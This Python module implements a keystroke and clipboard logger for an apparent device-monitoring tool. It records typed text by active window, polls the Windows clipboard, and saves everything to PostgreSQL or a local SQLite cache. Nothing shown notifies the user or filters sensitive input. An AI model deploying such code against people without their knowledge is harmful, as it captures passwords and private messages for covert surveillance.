import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import time
import threading
from datetime import datetime
import config
import database
from tracker import offline_manager
from tracker.window_monitor import get_active_window_info

# Try importing pynput
try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except Exception as e:
    PYNPUT_AVAILABLE = False
    print(f"[KeystrokeManager Warning] pynput could not be imported: {e}")

# Try importing win32clipboard
try:
    import win32clipboard
    import win32con
    CLIPBOARD_AVAILABLE = True
except Exception:
    CLIPBOARD_AVAILABLE = False


class KeystrokeManager:
    def __init__(self, device_id):
        self.device_id = device_id
        self.running = False
        self.lock = threading.Lock()
        
        # In-memory buffer for active typing
        self.buffer = []
        self.current_process = None
        self.current_title = None
        self.current_category = "Other"
        self.last_keypress_time = 0

        # Queue of completed sentences/blocks ready to commit
        self.pending_queue = []
        
        # Clipboard tracking
        self.last_clipboard_text = None
        
        # Threads
        self.listener = None
        self.worker_thread = None
        self.clipboard_thread = None

    def start(self):
        """Starts the keyboard listener, timer flusher, and clipboard monitor."""
        if not config.KEYSTROKE_LOGGING_ENABLED:
            print("[KeystrokeManager] Keystroke logging disabled in config.")
            return

        self.running = True

        # 1. Start keyboard listener
        if PYNPUT_AVAILABLE:
            try:
                self.listener = keyboard.Listener(
                    on_press=self._on_press
                )
                self.listener.daemon = True
                self.listener.start()
                print("[KeystrokeManager] Keystroke listener active.")
            except Exception as e:
                print(f"[KeystrokeManager Error] Failed to start keyboard listener: {e}")

        # 2. Start clipboard monitoring thread
        if config.CLIPBOARD_LOGGING_ENABLED and CLIPBOARD_AVAILABLE:
            self.clipboard_thread = threading.Thread(target=self._clipboard_loop, daemon=True)
            self.clipboard_thread.start()
            print("[KeystrokeManager] Clipboard monitor active.")

        # 3. Start worker thread for periodic flush and database commits
        self.worker_thread = threading.Thread(target=self._worker_loop, daemon=True)
        self.worker_thread.start()

    def _get_current_window(self):
        """Safely retrieves active window info."""
        try:
            info = get_active_window_info()
            pname = info.get("process_name", "unknown")
            title = info.get("window_title", "")
            return pname, title
        except Exception:
            return "unknown", ""

    def _on_press(self, key):
        """Callback on every keypress."""
        if not self.running:
            return

        now = time.time()
        pname, title = self._get_current_window()

        with self.lock:
            # If active window switched while text was still in buffer, flush the previous window's text
            if self.buffer and (self.current_process != pname or self.current_title != title):
                self._flush_buffer_locked(recorded_at=self.last_keypress_time)

            # Update window tracking for current typing session
            self.current_process = pname
            self.current_title = title
            self.last_keypress_time = now

            # Process key representation
            char = None
            if hasattr(key, 'char') and key.char is not None:
                char = key.char
            elif key == keyboard.Key.space:
                char = ' '
            elif key == keyboard.Key.enter:
                # Enter indicates line/search submission -> flush immediately
                self._flush_buffer_locked(recorded_at=now)
                return
            elif key == keyboard.Key.backspace:
                if self.buffer:
                    self.buffer.pop()
                return
            elif key == keyboard.Key.tab:
                char = ' '
            else:
                # Ignore non-character keys like Shift, Ctrl, Alt, F1-F12, etc.
                return

            if char:
                self.buffer.append(char)
                # If buffer exceeds reasonable sentence size (e.g. 250 chars), flush
                if len(self.buffer) >= 250:
                    self._flush_buffer_locked(recorded_at=now)

    def _flush_buffer_locked(self, recorded_at=None):
        """Flushes buffered characters into pending_queue (MUST be called while holding self.lock)."""
        if not self.buffer:
            return

        text = "".join(self.buffer).strip()
        self.buffer = []

        if not text:
            return

        rec_time = datetime.fromtimestamp(recorded_at) if recorded_at else datetime.now()
        rec_str = rec_time.strftime("%Y-%m-%d %H:%M:%S")

        self.pending_queue.append((
            self.current_process or "unknown",
            (self.current_title or "")[:250],
            "Other",
            text,
            "keystroke",
            rec_str
        ))

    def flush(self):
        """Public method to flush any currently pending characters and push queue to database."""
        with self.lock:
            self._flush_buffer_locked()
            items_to_save = list(self.pending_queue)
            self.pending_queue.clear()

        if items_to_save:
            self._save_batch_to_storage(items_to_save)

    def _clipboard_loop(self):
        """Monitors Windows clipboard for new copied text."""
        # Prime initial clipboard so we don't log existing content on startup
        try:
            win32clipboard.OpenClipboard()
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                self.last_clipboard_text = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
            win32clipboard.CloseClipboard()
        except Exception:
            pass

        while self.running:
            try:
                time.sleep(3.5)
                clip_text = None
                try:
                    win32clipboard.OpenClipboard()
                    if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                        clip_text = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                    win32clipboard.CloseClipboard()
                except Exception:
                    continue

                if clip_text and clip_text.strip():
                    trimmed = clip_text.strip()
                    # Only log if text changed, reasonable length, and not excessively long (<= 5000 chars)
                    if trimmed != self.last_clipboard_text and 1 <= len(trimmed) <= 5000:
                        self.last_clipboard_text = trimmed
                        pname, title = self._get_current_window()
                        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        with self.lock:
                            self.pending_queue.append((
                                pname,
                                title[:250],
                                "Other",
                                trimmed,
                                "clipboard",
                                now_str
                            ))
            except Exception as e:
                time.sleep(3.0)

    def _worker_loop(self):
        """Worker loop that checks inactivity timeout and commits pending batches."""
        last_commit_time = time.time()

        while self.running:
            try:
                time.sleep(1.0)
                now = time.time()

                # Check inactivity timeout: if user stopped typing for KEYSTROKE_FLUSH_INTERVAL_SECONDS, flush buffer
                with self.lock:
                    if self.buffer and (now - self.last_keypress_time >= config.KEYSTROKE_FLUSH_INTERVAL_SECONDS):
                        self._flush_buffer_locked(recorded_at=self.last_keypress_time)

                    # Check if ready to commit to storage (every 8s or if queue >= 5 items)
                    should_commit = (now - last_commit_time >= 8.0) or (len(self.pending_queue) >= 5)
                    items_to_save = []
                    if should_commit and self.pending_queue:
                        items_to_save = list(self.pending_queue)
                        self.pending_queue.clear()
                        last_commit_time = now

                if items_to_save:
                    self._save_batch_to_storage(items_to_save)

            except Exception as e:
                time.sleep(2.0)

    def _save_batch_to_storage(self, batch):
        """Attempts to save batch to PostgreSQL; falls back to offline SQLite cache."""
        if not batch:
            return

        try:
            if offline_manager.is_postgres_available():
                database.save_keystroke_batch(self.device_id, batch)
                return
        except Exception as e:
            pass

        # Buffer offline in SQLite
        try:
            offline_manager.queue_offline_keystroke_batch(self.device_id, batch)
        except Exception as e:
            print(f"[KeystrokeManager Offline Error] {e}")

    def stop(self):
        """Stops the keystroke listener and flushes all remaining text."""
        self.running = False
        try:
            if self.listener:
                self.listener.stop()
        except Exception:
            pass
        self.flush()
        print("[KeystrokeManager] Keystroke manager stopped.")
